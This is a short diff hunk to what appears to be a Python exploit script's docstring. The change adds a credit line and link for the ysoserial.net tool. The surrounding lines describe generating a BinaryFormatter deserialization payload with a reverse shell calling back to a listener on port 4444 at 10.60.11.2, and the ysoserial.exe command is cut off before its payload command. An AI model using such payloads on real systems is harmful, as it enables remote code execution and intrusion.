@@ -27,6 +27,8 @@ if __name__ == "__main__":
 
     """
     1) Use ysoserial.net for generating malformed serialized data with reverse shell payload.
+       Let's say thanks to pwntester for this lovely tool: https://github.com/pwntester/ysoserial.net
+       
        Suppose, we listen port 4444 on 10.60.11.2
     
     ./ysoserial.exe -g TypeConfuseDelegateMono -f BinaryFormatter -c 
